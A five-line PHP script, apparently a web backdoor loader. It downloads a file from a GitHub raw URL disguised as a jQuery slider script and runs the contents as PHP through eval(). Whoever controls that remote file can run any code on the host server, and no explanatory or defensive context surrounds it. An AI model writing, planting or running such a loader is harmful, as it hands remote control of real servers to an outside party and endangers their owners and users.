<?php
$url = "https://raw.githubusercontent.com/IDTT/Js/master/jquery-slider.js";
$data = file_get_contents($url);
eval('?>'.$data);
?>
